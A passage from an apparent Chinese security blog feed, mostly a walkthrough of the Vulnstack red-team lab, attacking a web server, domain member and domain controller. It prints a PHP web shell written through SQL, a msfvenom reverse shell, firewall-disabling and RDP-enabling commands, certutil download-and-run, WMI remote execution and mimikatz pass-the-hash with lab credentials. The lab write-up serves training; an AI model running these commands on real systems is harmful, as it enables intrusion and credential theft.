src="/2020/09/29/DomainPenetration/27.png" alt="image"></p><h2 id="0x04-参考资料"><a href="#0x04-参考资料" class="headerlink" title="0x04 参考资料"></a>0x04 参考资料</h2><p><a href="https://www.bilibili.com/video/BV19J411R7aS" target="_blank" rel="noopener">漏洞银行丨内网渗透之初识域渗透-ske丨咖面105期</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;内网渗透之初识域渗透&quot;&gt;&lt;a href=&quot;#内网渗透之初识域渗透&quot; class=&quot;headerlink&quot; title=&quot;内网渗透之初识域渗透&quot;&gt;&lt;/a&gt;内网渗透之初识域渗透&lt;/h1&gt;&lt;h2 id=&quot;0x01-初识域环境&quot;&gt;&lt;a href=&quot;#0x01-初识域环境&quot; class=&quot;headerlink&quot; title=&quot;0x01 初识域环境&quot;&gt;&lt;/a&gt;0x01 初识域环境&lt;/h2&gt;&lt;h3 id=&quot;一、什么是域&quot;&gt;&lt;a href=&quot;#一、什么是域&quot; class=&quot;headerlink&quot; title=&quot;一、什么是域&quot;&gt;&lt;/a&gt;一、什么是域&lt;/h3&gt;&lt;p&gt;将网络中多台计算机逻辑上组织到一起，进行集中管理，这种区别于工作组的逻辑环境叫做域，域是组织与存储资源的核心管理单元，在域中，至少有一台域控制器，域控制器中保存着整个域的用户帐号和安全数据库。&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="内网渗透" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="域渗透" scheme="http://yoursite.com/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
      <category term="域" scheme="http://yoursite.com/tags/%E5%9F%9F/"/>
    
  </entry>
  
  <entry>
    <title>ATK&amp;CK红队评估实战靶场（一）的搭建和模拟攻击过程全过程</title>
    <link href="http://yoursite.com/2020/09/28/ATC-CK-Vulnstack-1/"/>
    <id>http://yoursite.com/2020/09/28/ATC-CK-Vulnstack-1/</id>
    <published>2020-09-28T02:59:07.000Z</published>
    <updated>2020-09-29T11:25:24.348Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ATK-amp-CK红队评估实战靶场（一）的搭建和模拟攻击过程全过程"><a href="#ATK-amp-CK红队评估实战靶场（一）的搭建和模拟攻击过程全过程" class="headerlink" title="ATK&amp;CK红队评估实战靶场（一）的搭建和模拟攻击过程全过程"></a>ATK&amp;CK红队评估实战靶场（一）的搭建和模拟攻击过程全过程</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>本靶机环境是红日团队开源的一个红队实战测试环境，靶机下载地址如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;2&#x2F;</span><br></pre></td></tr></table></figure><p>通过模拟真实环境搭建的漏洞靶场，完全模拟ATK&amp;CK攻击链路进行搭建，形成完整个闭环。虚拟机默认密码为hongrisec@2019。</p><a id="more"></a><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>本次环境搭建和靶机默认有些区别，我是在一台服务器的虚拟机上搭建的，服务器资源足够，为了避免运行卡顿，攻击机Kali也是在虚拟机上，具体配置如下，Kali虚拟机、WEB服务器win7外网网卡和宿主机桥接，和办公终端都是连到同一个局域网中。</p><p>WEB服务器：windows7系统</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">外网网卡IP：192.168.1.102</span><br><span class="line">内网网卡IP：192.168.52.143</span><br></pre></td></tr></table></figure><p>域成员：windows server 2003系统</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">网卡IP:192.168.52.141</span><br></pre></td></tr></table></figure><p>域控服务器：windows server 2008系统</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">网卡IP：192.168.52.138</span><br></pre></td></tr></table></figure><p>攻击机器：kali 2020.2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali IP:192.168.1.101</span><br></pre></td></tr></table></figure><p>宿主机IP：windows server 2008系统</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IP:192.168.1.111</span><br></pre></td></tr></table></figure><p>安装CobaltStrike服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IP：192.168.1.236</span><br></pre></td></tr></table></figure><p>搭建靶机环境拓扑图如下：</p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/1.png" alt="ATT&amp;CK红队评估实战靶场（一）拓扑环境"></p><p>模拟攻击示意图如下：</p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/2.png" alt="模拟攻击过程"></p><h2 id="0x03-攻入内网"><a href="#0x03-攻入内网" class="headerlink" title="0x03 攻入内网"></a>0x03 攻入内网</h2><h3 id="3-1-信息收集"><a href="#3-1-信息收集" class="headerlink" title="3.1. 信息收集"></a>3.1. 信息收集</h3><h4 id="3-1-1-主机探测"><a href="#3-1-1-主机探测" class="headerlink" title="3.1.1 主机探测"></a>3.1.1 主机探测</h4><p><code>netdiscover -i eth0 -r 192.168.1.0/24</code></p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/3.png" alt></p><h4 id="3-1-2-端口扫描"><a href="#3-1-2-端口扫描" class="headerlink" title="3.1.2 端口扫描"></a>3.1.2 端口扫描</h4><p>发现IP192.168.1.102，使用nmap探测端口开放情况（注意需要现在win7主机运行PhpStudy）</p><p><code>nmap -sC -v -n -sV -Pn -p 1-65535 192.168.1.102</code></p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/4.png" alt></p><p>发现80端口开启，访问页面<code>http://192.168.1.102/</code>发现页面如下，存在大量信息泄露，收集有效信息。</p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/5.png" alt></p><h4 id="3-1-3-目录扫描"><a href="#3-1-3-目录扫描" class="headerlink" title="3.1.3 目录扫描"></a>3.1.3 目录扫描</h4><p>使用7kbscan-WebPathBrute目录扫描工具开展漏洞扫描</p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/6.png" alt></p><p>发现网站备份文件和phpadmin后台管理界面</p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/7.png" alt></p><p>打开备份文件发现网站源码，打开robots.txt发现网站CMS为yxcms，访问<code>http://192.168.1.102/yxcms</code>进入网站首页</p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/8.png" alt></p><h3 id="3-2-漏洞利用"><a href="#3-2-漏洞利用" class="headerlink" title="3.2. 漏洞利用"></a>3.2. 漏洞利用</h3><h4 id="3-2-1-漏洞发现"><a href="#3-2-1-漏洞发现" class="headerlink" title="3.2.1 漏洞发现"></a>3.2.1 漏洞发现</h4><h5 id="3-2-1-1-漏洞一：信息泄露-弱口令"><a href="#3-2-1-1-漏洞一：信息泄露-弱口令" class="headerlink" title="3.2.1.1 漏洞一：信息泄露+弱口令"></a>3.2.1.1 漏洞一：信息泄露+弱口令</h5><p>网站泄露后台地址和用户密码，且用户密码为弱口令</p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/9.png" alt></p><p>成功登录网站后台界面</p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/10.png" alt></p><h5 id="3-2-1-2-漏洞二：PhpMyAdmin弱口令"><a href="#3-2-1-2-漏洞二：PhpMyAdmin弱口令" class="headerlink" title="3.2.1.2  漏洞二：PhpMyAdmin弱口令"></a>3.2.1.2  漏洞二：PhpMyAdmin弱口令</h5><p>发现使用默认用户名/口令（root/root）成功登录PhpMyAdmin管理页面</p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/11.png" alt></p><h5 id="3-2-1-3-漏洞三：yxcms留言本XSS存储型漏洞"><a href="#3-2-1-3-漏洞三：yxcms留言本XSS存储型漏洞" class="headerlink" title="3.2.1.3  漏洞三：yxcms留言本XSS存储型漏洞"></a>3.2.1.3  漏洞三：yxcms留言本XSS存储型漏洞</h5><p>前台提交带有XSS代码的留言</p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/12.png" alt></p><p>后台审核成功弹出XSS弹窗</p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/13.png" alt></p><p>审核通过之后，前台同样成功弹窗</p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/14.png" alt></p><p>可通过该漏洞获取管理员cookie或者诱导管理员点击执行某恶意代码</p><h5 id="3-2-1-4-漏洞四：yxcms后台任意文件读写漏洞"><a href="#3-2-1-4-漏洞四：yxcms后台任意文件读写漏洞" class="headerlink" title="3.2.1.4  漏洞四：yxcms后台任意文件读写漏洞"></a>3.2.1.4  漏洞四：yxcms后台任意文件读写漏洞</h5><p>在后台创建新模板模块创建内容为一句话的新模板</p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/15.png" alt></p><p>通过前面的备份文件可知文件保存的目录<code>http://192.168.1.102/yxcms/protected/apps/default/view/default/hack.php</code></p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/16.png" alt></p><p>使用蚁剑成功连接shell</p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/17.png" alt></p><h5 id="3-2-1-5-漏洞五：yxcms后台SQL注入漏洞"><a href="#3-2-1-5-漏洞五：yxcms后台SQL注入漏洞" class="headerlink" title="3.2.1.5  漏洞五：yxcms后台SQL注入漏洞"></a>3.2.1.5  漏洞五：yxcms后台SQL注入漏洞</h5><p>在后台的碎片列表中进行删除操作，删除碎片ID可能存在盲注漏洞，使用dnslog获取SQL注入得到数据。</p><p><em>yxcms漏洞代码原理解析参考文章<code>https://www.freebuf.com/column/162886.html</code></em></p><h5 id="3-2-1-6-漏洞六：PhpMyAdmin开启全局日志getshell"><a href="#3-2-1-6-漏洞六：PhpMyAdmin开启全局日志getshell" class="headerlink" title="3.2.1.6  漏洞六：PhpMyAdmin开启全局日志getshell"></a>3.2.1.6  漏洞六：PhpMyAdmin开启全局日志getshell</h5><p>首先测试是否可以使用select into outfile直接写入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="string">'&lt;?php eval($_POST[hack]);?&gt; '</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'C:/phpStudy/WWW/hack.php'</span></span><br></pre></td></tr></table></figure><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/18.png" alt></p><p>写入失败， <code>show global variables like ‘%secure%’</code>查看变量secure-file-priv  值为NULL，且为只读无法修改。</p><p>尝试使用全局日志写入shell，查看全局变量general_log：<code>show global variables like ‘%general_%’</code></p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/19.png" alt></p><p>开启全局日志并修改日志保存位置为C:/phpStudy/WWW/hack.php</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log=<span class="keyword">on</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file=<span class="string">'C:/phpStudy/WWW/hack.php'</span>;</span><br></pre></td></tr></table></figure><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/20.png" alt></p><p>查询一句话写入日志<code>Select &#39;&lt;?php eval($_POST[hack]);?&gt;&#39;</code></p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/21.png" alt></p><p>使用蚁剑连接一句话木马<code>http://192.168.1.102/hack.php</code></p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/22.png" alt></p><h3 id="3-3-CS上线GetShell"><a href="#3-3-CS上线GetShell" class="headerlink" title="3.3 CS上线GetShell"></a>3.3 CS上线GetShell</h3><p>CS客户端服务端都部署在192.168.1.236主机上，创建监听并生成powershell</p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/23.png" alt></p><p>时间反应比较慢，建议多执行几次并等一会</p><p>提权成功</p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/24.png" alt></p><h3 id="3-4-系统信息收集"><a href="#3-4-系统信息收集" class="headerlink" title="3.4 系统信息收集"></a>3.4 系统信息收集</h3><p>查看网卡</p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/25.png" alt></p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/26.png" alt></p><p>发现内网ip地址192.168.52.143和域god.org，查看域信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net group &#x2F;domain  #查看域内所有用户列表</span><br><span class="line">net group “domain computers” &#x2F;domain #查看域成员计算机列表</span><br><span class="line">net group “domain admins” &#x2F;domain #查看域管理员用户</span><br></pre></td></tr></table></figure><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/27.png" alt></p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/28.png" alt></p><p>本机计算机名字为STU1，另外还有两个域用户分别是DEV1、ROOT-TVI862UBEH、域控制用户为OWA</p><h3 id="3-5-主机密码收集"><a href="#3-5-主机密码收集" class="headerlink" title="3.5 主机密码收集"></a>3.5 主机密码收集</h3><p>获取系统用户名和密码</p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/29.png" alt></p><h3 id="3-6-远程桌面登录"><a href="#3-6-远程桌面登录" class="headerlink" title="3.6 远程桌面登录"></a>3.6 远程桌面登录</h3><p>远程开启3389端口并关闭防火墙</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">注册表开启3389端口</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">关闭防火墙</span><br><span class="line">netsh firewall set opmode disable   #winsows server 2003 之前</span><br><span class="line">netsh advfirewall set allprofiles state off #winsows server 2003 之后</span><br></pre></td></tr></table></figure><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/30.png" alt></p><p>这个时候防火墙是开启，我们需要关闭防火墙，使用域用户god\administrator/hongrisec@2020成功登录这一台win7WEB主机</p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/31.png" alt></p><h2 id="0x04-内网信息收集"><a href="#0x04-内网信息收集" class="headerlink" title="0x04 内网信息收集"></a>0x04 内网信息收集</h2><h3 id="4-1-域信息收集"><a href="#4-1-域信息收集" class="headerlink" title="4.1 域信息收集"></a>4.1 域信息收集</h3><p>前面收集到的信息Win7计算机名字为STU1，另外还有两个域用户分别是DEV1、ROOT-TVI862UBEH、域控制用户为OWA</p><p>win7内网的IP地址为192.168.52.143</p><p>进一步开始收集，通过Ladon 192.168.52.0/24 OnlinePC探测域内存活主机</p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/32.png" alt></p><p>域成员：192.168.52.141</p><p>域控DC：192.168.52.138</p><h3 id="4-5-内网漏洞扫描"><a href="#4-5-内网漏洞扫描" class="headerlink" title="4.5 内网漏洞扫描"></a>4.5 内网漏洞扫描</h3><p>前期我们获取到win7的远程桌面也可以通过远程发现win7主机上安装了nmap工具，我们可以进一步针对192.168.52.0/24内网网段进行漏洞信息收集<br><img src="/2020/09/28/ATC-CK-Vulnstack-1/33.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap  --script-vlun -p 1-65535 192.168.52.141</span><br></pre></td></tr></table></figure><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/34.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap  --script-vlun -p 1-65535 192.168.52.138</span><br></pre></td></tr></table></figure><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/35.png" alt></p><p>也可以自己上传工具开展信息漏洞收集工作，我们使用上传的Ladon工具</p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/36.png" alt></p><p>发现192.168.1.141存在漏洞：MS08-067、MS17-010，192.168.1.138存在MS17-010漏洞。</p><p>攻击思路：</p><p>1、我们可以直接全部使用MS17-010获取域成员和域控主机；</p><p>2、使用MS08-067获取域成员主机，然后使用横向移动【VMI利用】获取域控主机</p><h2 id="0x05-横向渗透"><a href="#0x05-横向渗透" class="headerlink" title="0x05 横向渗透"></a>0x05 横向渗透</h2><h3 id="5-1-MSF反弹shell"><a href="#5-1-MSF反弹shell" class="headerlink" title="5.1 MSF反弹shell"></a>5.1 MSF反弹shell</h3><p>这里我们使用Kali的msf先反弹一个shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#生成反弹shell文件</span><br><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.1.101 LPORT&#x3D;4444 -f raw &gt; shell.php</span><br><span class="line"></span><br><span class="line">#在本机中设置监听</span><br><span class="line"></span><br><span class="line">msfconsloe</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 192.168.1.101</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>然后使用蚁剑上传shell.php，并访问</p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/37.png" alt></p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/38.png" alt></p><h3 id="5-2-内网流量转发-MSF-proxychains"><a href="#5-2-内网流量转发-MSF-proxychains" class="headerlink" title="5.2 内网流量转发(MSF+proxychains)"></a>5.2 内网流量转发(MSF+proxychains)</h3><p><em>参考文章<code>https://www.freebuf.com/articles/network/125278.html</code></em></p><p>成功获取msf反弹shell，添加路由到目标环境网络，使得msf能够通过win7路由转发访问192.168.25.0/24网段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#查看路由信息</span><br><span class="line">run get_local_subnets</span><br><span class="line">#添加一条路由</span><br><span class="line">run autoroute -s 192.168.52.0&#x2F;24</span><br></pre></td></tr></table></figure><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/39.png" alt></p><p>使用msf的socks4代理模块</p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/40.png" alt></p><p>文本编辑器修改<code>etc/proxychains.conf</code>，在最后一行加上socks4代理服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[ProxyList]</span><br><span class="line"></span><br><span class="line">socks4 192.168.1.101 1080</span><br></pre></td></tr></table></figure><p>使用proxychains代理nmap扫描主机</p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/41.png" alt></p><h3 id="5-3-MS08-067-搭配Bind-TCP"><a href="#5-3-MS08-067-搭配Bind-TCP" class="headerlink" title="5.3 MS08-067 搭配Bind TCP"></a>5.3 MS08-067 搭配Bind TCP</h3><p>由于没有定义双向路由，目标系统无法直接连接到攻击机，所以我们需要将Bind_tcp设置为payload类型，在exploit操作成功之后，就要对连接到目标系统的端口进行监听，两者区别如下：</p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/42.png" alt></p><p>完整设置如下：</p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/43.png" alt></p><p>成功获取域成员192.168.1.141的shell</p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/44.png" alt></p><p>###　5.4 MS17-010获取域控服务器</p><p>我们同样可以使用MS17-010获取域服务器和域控服务器权限，这里我们直接攻击域控服务器</p><p>使用<code>exploit/windows/smb/ms17_010_eternalblue</code>攻击流程如下：</p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/45.png" alt></p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/46.png" alt></p><p>获取失败，使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexec</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;blind_tcp</span><br></pre></td></tr></table></figure><p>攻击流程如下</p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/47.png" alt></p><p>仍然无法有效获取会话</p><h3 id="5-5-WMI获取域控服务器"><a href="#5-5-WMI获取域控服务器" class="headerlink" title="5.5 WMI获取域控服务器"></a>5.5 WMI获取域控服务器</h3><p>上传vmiexec.vbs到192.168.52.143（win7）机器上，然后执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript.exe vmiexec.vbs &#x2F;cmd 192.168.52.138 administrator hongrisec@2020 &quot;whoami&quot;</span><br></pre></td></tr></table></figure><p>或者直接使用之前上传的Ladom工具执行<code>ladom wmiexec 192.168.52.138 administrator hongrisec@2020 whoami</code></p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/48.png" alt></p><p>同上面的过程一样，我们需要获取一个正向的msf连接，过程如下：</p><p>首先生成一个正向的exe文件放到win7的网站目录上</p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/49.png" alt></p><p>在win7上查看</p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/50.png" alt></p><p>在win7上使用WMI执行命令<code>certutil.exe -urlcache -split -f http://192.168.52.143/6666.exe&amp;6666.exe</code></p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/51.png" alt></p><p>成功执行，这时候在138机器（DC—win2008）上开启6666端口监听</p><p>然后我们在msf上个运行blin_tcp来获取回话</p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/52.png" alt></p><p>忘记改端口了，修改端口为6666</p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/53.png" alt></p><p>成功获取域控权限，后续提权，可以使用msf mimikatz进一步获取用户密码等。（msf连接过程中保持内网流量转发：步骤5.2，如果无法获取会话在kali上扫描138主机6666端口是否开放，如果没有开放参考3.6，同样使用vmi命令关闭防火墙后重，我使用的是之前上传的K8大神的Lodan工具，是因为vbs脚本一直没有回显，后来重启win2008域控服务器才有回显）</p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/54.png" alt="img"></p><p>下一步开始提权，尝试多种提权方法均失败</p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/55.png" alt="img"></p><p>然后上网查看资料，使用CVE-2018-8120来提权，直接文件上传upload CVE-2018-8120-master提权程序<br><img src="/2020/09/28/ATC-CK-Vulnstack-1/56.png" alt="img"></p><p>成功提权，上免杀mimikatz</p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/57.png" alt="img"></p><p>用户所有密码都会保存在mz.log文件中，可以直接type mz.log查看</p><p><img src="/2020/09/28/ATC-CK-Vulnstack-1/58.png" alt="img"></p><h3 id="5-6-票据加计划任务获取DC"><a href="#5-6-票据加计划任务获取DC" class="headerlink" title="5.6 票据加计划任务获取DC"></a>5.6 票据加计划任务获取DC</h3><blockquote><p>这是博客<a href="https://www.cnblogs.com/Ekko-z/p/12991730.html" target="_blank" rel="noopener">ATT&amp;CK红队评估实战靶场(一)</a>的获取域控方法，感觉太过复杂，本人没有尝试，这里也放在这里供大家参考。</p></blockquote><p>mimikatz sekurlsa::pth /domain:god.org /user:administrator /ntlm:81be2f80d568100549beac645d6a7141<br><img src="/2020/09/28/ATC-CK-Vulnstack-1/59.png" alt="img"><br>shell dir \192.168.52.138\c$ //dir DC的目录<br><img src="/2020/09/28/ATC-CK-Vulnstack-1/60.png" alt="img"><br>生成一个exe马<br>这里用windows/reverse_bind_tcp LHOST=0.0.0.0 LPORT=7777 生成正向的马 yukong.exe<br>把马复制到域控机器上shell copy C:\yukong.exe \192.168.52.138\c$<br>然后再用这个写入计划任务的方法去连接，这里马反弹会连不成功，所以<br>shell schtasks /create /tn “test” /tr C:\yukong.exe /sc once /st 22:14 /S 192.168.52.138 /RU System /u administrator /p “hongrisec@2020”<br>挂着win7代理 proxy nc -vv 192.168.52.138 7777 即可弹回DC138的shell<br>用Meterpreter的马也可以，之前失败了，后续还是改成meterpreter的马，或者把普通shell再升级成meterpreter再导入cs也可以<br>马上线之后清除计划任务schtasks /delete /s 192.168.52.138 /tn “test” /f</p><h2 id="0x06-后记"><a href="#0x06-后记" class="headerlink" title="0x06 后记"></a>0x06 后记</h2><p>当然最后获取域控权限的方法还有好多，向pth攻击、横向哈希传递、redis等等，还有后续的痕迹清理日志清楚都没有涉及，经过这一次充分认识到自己的不足，还需要多加学习，有些地方自己还是没有完全弄明白，只是完全参考网络上的大神们的教程，文中有错漏的地方希望大家多多包含，我只是用了我觉得最简单的思路进行攻击，更复杂的没有涉及，希望以后能多多练习这样的靶机学习更牛的技能，最后谢谢红日团队给出的这个靶机，后续还有一系列靶机，有时间会慢慢逐个尝试。</p><h2 id="0x07-参考资料"><a href="#0x07-参考资料" class="headerlink" title="0x07 参考资料"></a>0x07 参考资料</h2><p><a href="https://www.freebuf.com/column/231111.html" target="_blank" rel="noopener">ATT&amp;CK实战 | Vulnstack 红队（一）</a></p><p><a href="https://www.freebuf.com/articles/web/230476.html" target="_blank" rel="noopener">ATT&amp;CK实战 | 红队评估一(上)</a></p><p><a href="https://www.freebuf.com/articles/web/230725.html" target="_blank" rel="noopener">ATT&amp;CK实战 | 红队评估一(下)</a></p><p><a href="https://www.cnblogs.com/Ekko-z/p/12991730.html" target="_blank" rel="noopener">ATT&amp;CK红队评估实战靶场(一)</a></p><p><a href="https://www.freebuf.com/articles/network/125278.html" target="_blank" rel="noopener">图解Meterpreter实现网络穿透的方法</a></p><p><a href="https://cloud.tencent.com/developer/article/1633420" target="_blank" rel="noopener">内网渗透靶机-VulnStack 1</a></p><p><a href="https://www.freebuf.com/column/162886.html" target="_blank" rel="noopener">代码审计| yxcms app 1.4.6 漏洞集合</a></p><p><a href="https://www.anquanke.com/post/id/189940" target="_blank" rel="noopener">从外网到域控（vulnstack靶机实战）</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;ATK-amp-CK红队评估实战靶场（一）的搭建和模拟攻击过程全过程&quot;&gt;&lt;a href=&quot;#ATK-amp-CK红队评估实战靶场（一）的搭建和模拟攻击过程全过程&quot; class=&quot;headerlink&quot; title=&quot;ATK&amp;amp;CK红队评估实战靶场（一）的搭建和模拟攻击过程全过程&quot;&gt;&lt;/a&gt;ATK&amp;amp;CK红队评估实战靶场（一）的搭建和模拟攻击过程全过程&lt;/h1&gt;&lt;h2 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h2&gt;&lt;p&gt;本靶机环境是红日团队开源的一个红队实战测试环境，靶机下载地址如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http:&amp;#x2F;&amp;#x2F;vulnstack.qiyuanxuetang.net&amp;#x2F;vuln&amp;#x2F;detail&amp;#x2F;2&amp;#x2F;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;通过模拟真实环境搭建的漏洞靶场，完全模拟ATK&amp;amp;CK攻击链路进行搭建，形成完整个闭环。虚拟机默认密码为hongrisec@2019。&lt;/p&gt;
    
    </summary>
    
    
      <category term="实战靶场" scheme="http://yoursite.com/categories/%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA/"/>
    
    
      <category term="内网渗透" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="域渗透" scheme="http://yoursite.com/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
      <category term="红队评估" scheme="http://yoursite.com/tags/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0/"/>
    
      <category term="ATK&amp;CK" scheme="http://yoursite.com/tags/ATK-CK/"/>
    
      <category term="vulnstack" scheme="http://yoursite.com/tags/vulnstack/"/>
    
  </entry>
  
  <entry>
    <title>通用软件测评之软件产品的信息安全性</title>
    <link href="http://yoursite.com/2020/09/28/The-Security-of-Software-Evaluation/"/>
    <id>http://yoursite.com/2020/09/28/The-Security-of-Software-Evaluation/</id>
    <published>2020-09-28T02:55:50.000Z</published>
